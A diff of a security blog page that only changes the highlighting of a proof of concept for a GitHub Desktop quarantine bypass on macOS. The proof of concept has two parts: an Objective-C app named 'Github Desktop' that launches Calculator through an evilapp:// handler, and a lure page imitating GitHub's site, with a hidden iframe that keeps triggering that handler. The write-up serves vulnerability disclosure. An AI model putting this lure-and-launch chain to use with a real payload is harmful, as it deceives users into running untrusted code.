@@ -54,7 +54,7 @@ The GitHub Desktop app doesn’t add the quarantine extended attribute to files 
 
   
   
-  <link rel="stylesheet" href="https://theevilbit.github.io/css/coder.min.b886fe0d9034709648f91f4ce178f51dd367d9350f82dd1132d54fd69bfca66f.css" integrity="sha256-uIb&#43;DZA0cJZI&#43;R9M4Xj1HdNn2TUPgt0RMtVP1pv8pm8=" crossorigin="anonymous" media="screen" />
+  <link rel="stylesheet" href="https://theevilbit.github.io/css/coder.min.4410e480b3bad72c110a96b56e5aa8c36c24a0f3735b278818123b0fa4393fcd.css" integrity="sha256-RBDkgLO61ywRCpa1blqow2wkoPNzWyeIGBI7D6Q5P80=" crossorigin="anonymous" media="screen" />
 
 
 
@@ -254,117 +254,117 @@ In short upon download of the application launch services daemon (<code>lsd</cod
   </a>
 </h3>
 <p>As noted above, I created an app, which will launch Calculator, and do nothing else, the URL handler it will use is <code>evilapp://</code> its source is very simple:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#75715e">//
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//  AppDelegate.m
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//  Github Desktop
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//  Created by Csaba Fitzl on 2019. 09. 26..
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//  Copyright © 2019. Csaba Fitzl. All rights reserved.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#import &#34;AppDelegate.h&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">@interface</span> <span style="color:#a6e22e">AppDelegate</span> ()
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">//
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">//  AppDelegate.m
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">//  Github Desktop
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">//
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">//  Created by Csaba Fitzl on 2019. 09. 26..
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">//  Copyright © 2019. Csaba Fitzl. All rights reserved.
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">//
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#099">#import &#34;AppDelegate.h&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@interface</span> <span style="color:#0a8;font-weight:bold">AppDelegate</span> ()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">@property</span> (<span style="color:#66d9ef">weak</span>) <span style="color:#66d9ef">IBOutlet</span> NSWindow <span style="color:#f92672">*</span>window;
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">@end</span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@property</span> (<span style="color:#069;font-weight:bold">weak</span>) <span style="color:#078;font-weight:bold">IBOutlet</span> NSWindow <span style="color:#555">*</span>window;
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@end</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">@implementation</span> <span style="color:#a6e22e">AppDelegate</span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@implementation</span> <span style="color:#0a8;font-weight:bold">AppDelegate</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>- (<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">applicationDidFinishLaunching:</span>(NSNotification <span style="color:#f92672">*</span>)aNotification {
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Insert code here to initialize your application
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> pid <span style="color:#f92672">=</span> [[NSProcessInfo processInfo] processIdentifier];
-</span></span><span style="display:flex;"><span>    NSPipe <span style="color:#f92672">*</span>pipe <span style="color:#f92672">=</span> [NSPipe pipe];
-</span></span><span style="display:flex;"><span>    NSFileHandle <span style="color:#f92672">*</span>file <span style="color:#f92672">=</span> pipe.fileHandleForReading;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">applicationDidFinishLaunching:</span>(NSNotification <span style="color:#555">*</span>)<span style="color:#033">aNotification</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">// Insert code here to initialize your application
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#078;font-weight:bold">int</span> pid <span style="color:#555">=</span> [[NSProcessInfo processInfo] processIdentifier];
+</span></span><span style="display:flex;"><span>    NSPipe <span style="color:#555">*</span>pipe <span style="color:#555">=</span> [NSPipe pipe];
+</span></span><span style="display:flex;"><span>    NSFileHandle <span style="color:#555">*</span>file <span style="color:#555">=</span> pipe.fileHandleForReading;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    NSTask <span style="color:#f92672">*</span>task <span style="color:#f92672">=</span> [[NSTask alloc] init];
-</span></span><span style="display:flex;"><span>    task.launchPath <span style="color:#f92672">=</span> <span style="color:#e6db74">@&#34;/usr/bin/open&#34;</span>;
-</span></span><span style="display:flex;"><span>    task.arguments <span style="color:#f92672">=</span> <span style="color:#ae81ff">@[</span><span style="color:#e6db74">@&#34;/Applications/Calculator.app&#34;</span><span style="color:#ae81ff">]</span>;
-</span></span><span style="display:flex;"><span>    task.standardOutput <span style="color:#f92672">=</span> pipe;
+</span></span><span style="display:flex;"><span>    NSTask <span style="color:#555">*</span>task <span style="color:#555">=</span> [[NSTask alloc] init];
+</span></span><span style="display:flex;"><span>    task.launchPath <span style="color:#555">=</span> <span style="color:#c30">@&#34;/usr/bin/open&#34;</span>;
+</span></span><span style="display:flex;"><span>    task.arguments <span style="color:#555">=</span> @[<span style="color:#c30">@&#34;/Applications/Calculator.app&#34;</span>];
+</span></span><span style="display:flex;"><span>    task.standardOutput <span style="color:#555">=</span> pipe;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    [task launch];
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>- (<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">applicationWillTerminate:</span>(NSNotification <span style="color:#f92672">*</span>)aNotification {
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Insert code here to tear down your application
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">applicationWillTerminate:</span>(NSNotification <span style="color:#555">*</span>)<span style="color:#033">aNotification</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">// Insert code here to tear down your application
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>}
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">@end</span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@end</span>
 </span></span></code></pre></div><p>The compiled application is hosted here, along with the full Xcode project: <a href="https://github.com/theevilbit/githubpoc"  class="external-link" target="_blank" rel="noopener">GitHub - theevilbit/githubpoc</a> The name of the app is <code>Github Desktop</code> (lower case ‘h’!). The reason for this is when it’s triggered the user will see a popup saying that the page wants to execute <code>Github Desktop.app</code>, this will lower the victim suspicion, as it’s something expected, and more likely to click.</p>
 <p>I created a simple HTML page that has a link to this repo, and it also has a JavaScript, which will add an <code>iframe</code> to the page’s DOM, with a link to <code>evilapp://</code>to trigger the downloaded application, the page will be refreshed every 10 seconds. The page source is:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!doctype html&gt;</span>
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;windows&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">head</span>&gt;
-</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;X-UA-Compatible&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;IE=edge,chrome=1&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;content-language&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en-gb&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1, maximum-scale=1&#34;</span>&gt;
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#099">&lt;!doctype html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#309;font-weight:bold">html</span> <span style="color:#309">lang</span><span style="color:#555">=</span><span style="color:#c30">&#34;en&#34;</span> <span style="color:#309">class</span><span style="color:#555">=</span><span style="color:#c30">&#34;windows&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#309;font-weight:bold">head</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#309;font-weight:bold">meta</span> <span style="color:#309">charset</span><span style="color:#555">=</span><span style="color:#c30">&#34;utf-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#309;font-weight:bold">meta</span> <span style="color:#309">http-equiv</span><span style="color:#555">=</span><span style="color:#c30">&#34;X-UA-Compatible&#34;</span> <span style="color:#309">content</span><span style="color:#555">=</span><span style="color:#c30">&#34;IE=edge,chrome=1&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#309;font-weight:bold">meta</span> <span style="color:#309">http-equiv</span><span style="color:#555">=</span><span style="color:#c30">&#34;content-language&#34;</span> <span style="color:#309">content</span><span style="color:#555">=</span><span style="color:#c30">&#34;en-gb&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#309;font-weight:bold">meta</span> <span style="color:#309">name</span><span style="color:#555">=</span><span style="color:#c30">&#34;viewport&#34;</span> <span style="color:#309">content</span><span style="color:#555">=</span><span style="color:#c30">&#34;width=device-width, initial-scale=1, maximum-scale=1&#34;</span>&gt;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">https://desktop.github.com/styles.css?71851157c0a6bd58db329a7827172c59506c6083</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#309;font-weight:bold">link</span> <span style="color:#309">rel</span><span style="color:#555">=</span><span style="color:#c30">&#34;stylesheet&#34;</span> <span style="color:#309">type</span><span style="color:#555">=</span><span style="color:#c30">&#34;text/css&#34;</span> <span style="color:#309">href</span><span style="color:#555">=</span><span style="color:#c30">https://desktop.github.com/styles.css?71851157c0a6bd58db329a7827172c59506c6083</span>&gt;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;icon&#34;</span> <span style="color:#a6e22e">sizes</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;any&#34;</span> <span style="color:#a6e22e">mask</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://assets-cdn.github.com/pinned-octocat.svg&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;icon&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;image/x-icon&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://assets-cdn.github.com/favicon.ico&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#309;font-weight:bold">link</span> <span style="color:#309">rel</span><span style="color:#555">=</span><span style="color:#c30">&#34;icon&#34;</span> <span style="color:#309">sizes</span><span style="color:#555">=</span><span style="color:#c30">&#34;any&#34;</span> <span style="color:#309">mask</span> <span style="color:#309">href</span><span style="color:#555">=</span><span style="color:#c30">&#34;https://assets-cdn.github.com/pinned-octocat.svg&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#309;font-weight:bold">link</span> <span style="color:#309">rel</span><span style="color:#555">=</span><span style="color:#c30">&#34;icon&#34;</span> <span style="color:#309">type</span><span style="color:#555">=</span><span style="color:#c30">&#34;image/x-icon&#34;</span> <span style="color:#309">href</span><span style="color:#555">=</span><span style="color:#c30">&#34;https://assets-cdn.github.com/favicon.ico&#34;</span>&gt;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://desktop.github.com/javascript/os.js&#34;</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#309;font-weight:bold">script</span> <span style="color:#309">src</span><span style="color:#555">=</span><span style="color:#c30">&#34;https://desktop.github.com/javascript/os.js&#34;</span> <span style="color:#309">charset</span><span style="color:#555">=</span><span style="color:#c30">&#34;utf-8&#34;</span>&gt;&lt;/<span style="color:#309;font-weight:bold">script</span>&gt;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">title</span>&gt;GitHub Desktop | Simple collaboration from your desktop&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#309;font-weight:bold">title</span>&gt;GitHub Desktop | Simple collaboration from your desktop&lt;/<span style="color:#309;font-weight:bold">title</span>&gt;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;text/javascript&#39;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#309;font-weight:bold">script</span> <span style="color:#309">type</span><span style="color:#555">=</span><span style="color:#c30">&#39;text/javascript&#39;</span>&gt;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>window.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">iframe</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;iframe&#39;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">iframe</span>.<span style="color:#a6e22e">style</span>.<span style="color:#a6e22e">display</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;none&#34;</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">iframe</span>.<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;evilapp://hahahah&#34;</span>;
-</span></span><span style="display:flex;"><span>    document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">iframe</span>);
-</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">function</span>(){  window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">reload</span>(<span style="color:#ae81ff">1</span>);}, <span style="color:#ae81ff">10000</span>);};
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#366">window</span>.onload <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">function</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">var</span> iframe <span style="color:#555">=</span> <span style="color:#366">document</span>.createElement(<span style="color:#c30">&#39;iframe&#39;</span>);
+</span></span><span style="display:flex;"><span>    iframe.style.display <span style="color:#555">=</span> <span style="color:#c30">&#34;none&#34;</span>;
+</span></span><span style="display:flex;"><span>    iframe.src <span style="color:#555">=</span> <span style="color:#c30">&#34;evilapp://hahahah&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#366">document</span>.body.appendChild(iframe);
+</span></span><span style="display:flex;"><span>	setTimeout(<span style="color:#069;font-weight:bold">function</span>(){  <span style="color:#366">window</span>.location.reload(<span style="color:#f60">1</span>);}, <span style="color:#f60">10000</span>);};
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#309;font-weight:bold">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#309;font-weight:bold">head</span>&gt;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">body</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">header</span>&gt;
-</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container-new py-6 px-3 text-center&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://desktop.github.com/images/desktop-icon.svg&#34;</span> <span style="color:#a6e22e">alt</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;GitHub Desktop&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;96&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;96&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">a</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">ul</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;nav list-style-none d-flex flex-justify-center f4&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">ul</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#309;font-weight:bold">body</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#309;font-weight:bold">header</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#309;font-weight:bold">div</span> <span style="color:#309">class</span><span style="color:#555">=</span><span style="color:#c30">&#34;container-new py-6 px-3 text-center&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#309;font-weight:bold">a</span> <span style="color:#309">href</span><span style="color:#555">=</span><span style="color:#c30">&#34;/&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#309;font-weight:bold">img</span> <span style="color:#309">src</span><span style="color:#555">=</span><span style="color:#c30">&#34;https://desktop.github.com/images/desktop-icon.svg&#34;</span> <span style="color:#309">alt</span><span style="color:#555">=</span><span style="color:#c30">&#34;GitHub Desktop&#34;</span> <span style="color:#309">width</span><span style="color:#555">=</span><span style="color:#c30">&#34;96&#34;</span> <span style="color:#309">height</span><span style="color:#555">=</span><span style="color:#c30">&#34;96&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#309;font-weight:bold">a</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#309;font-weight:bold">ul</span> <span style="color:#309">class</span><span style="color:#555">=</span><span style="color:#c30">&#34;nav list-style-none d-flex flex-justify-center f4&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#309;font-weight:bold">ul</span>&gt;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">div</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">header</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#309;font-weight:bold">div</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#309;font-weight:bold">header</span>&gt;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hero text-center&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container-new px-3&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;pb-6&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;f00-light text-white&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#309;font-weight:bold">div</span> <span style="color:#309">class</span><span style="color:#555">=</span><span style="color:#c30">&#34;hero text-center&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#309;font-weight:bold">div</span> <span style="color:#309">class</span><span style="color:#555">=</span><span style="color:#c30">&#34;container-new px-3&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#309;font-weight:bold">div</span> <span style="color:#309">class</span><span style="color:#555">=</span><span style="color:#c30">&#34;pb-6&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#309;font-weight:bold">h1</span> <span style="color:#309">class</span><span style="color:#555">=</span><span style="color:#c30">&#34;f00-light text-white&#34;</span>&gt;
 </span></span><span style="display:flex;"><span>        Totally Legit App
-</span></span><span style="display:flex;"><span>      &lt;/<span style="color:#f92672">h1</span>&gt;
-</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;col-md-8 mx-auto mb-4 f3-light&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>        Already using GitHub Desktop? Amazing!&lt;<span style="color:#f92672">br</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;/<span style="color:#309;font-weight:bold">h1</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#309;font-weight:bold">p</span> <span style="color:#309">class</span><span style="color:#555">=</span><span style="color:#c30">&#34;col-md-8 mx-auto mb-4 f3-light&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        Already using GitHub Desktop? Amazing!&lt;<span style="color:#309;font-weight:bold">br</span>&gt;
 </span></span><span style="display:flex;"><span>        Let&#39;s get you started! Click to clone the repository.
-</span></span><span style="display:flex;"><span>      &lt;/<span style="color:#f92672">p</span>&gt;
-</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mx-1 my-3 f3 btn btn-large btn-desktop-purple&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x-github-client://openRepo/https://github.com/theevilbit/githubpoc&#34;</span>&gt;Clone&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;/<span style="color:#309;font-weight:bold">p</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#309;font-weight:bold">a</span> <span style="color:#309">class</span><span style="color:#555">=</span><span style="color:#c30">&#34;mx-1 my-3 f3 btn btn-large btn-desktop-purple&#34;</span> <span style="color:#309">href</span><span style="color:#555">=</span><span style="color:#c30">&#34;x-github-client://openRepo/https://github.com/theevilbit/githubpoc&#34;</span>&gt;Clone&lt;/<span style="color:#309;font-weight:bold">a</span>&gt;
 </span></span><span style="display:flex;"><span>      
-</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mb-0&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>        New user? Download GitHub Desktop &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://desktop.github.com&#34;</span> <span style="color:#a6e22e">target</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;_blank&#34;</span>&gt;here&lt;/<span style="color:#f92672">a</span>&gt;
-</span></span><span style="display:flex;"><span>      &lt;/<span style="color:#f92672">p</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#309;font-weight:bold">p</span> <span style="color:#309">class</span><span style="color:#555">=</span><span style="color:#c30">&#34;mb-0&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        New user? Download GitHub Desktop &lt;<span style="color:#309;font-weight:bold">a</span> <span style="color:#309">href</span><span style="color:#555">=</span><span style="color:#c30">&#34;https://desktop.github.com&#34;</span> <span style="color:#309">target</span><span style="color:#555">=</span><span style="color:#c30">&#34;_blank&#34;</span>&gt;here&lt;/<span style="color:#309;font-weight:bold">a</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;/<span style="color:#309;font-weight:bold">p</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#309;font-weight:bold">div</span>&gt;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">div</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#309;font-weight:bold">div</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#309;font-weight:bold">div</span>&gt;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- Features --&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">&lt;!-- Features --&gt;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">footer</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mb-6 px-3 text-gray text-center alt-text-small&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;copyright&#34;</span>&gt;© 2019 GitHub, Inc. All rights reserved.&lt;/<span style="color:#f92672">p</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">footer</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#309;font-weight:bold">footer</span> <span style="color:#309">class</span><span style="color:#555">=</span><span style="color:#c30">&#34;mb-6 px-3 text-gray text-center alt-text-small&#34;</span>&gt;
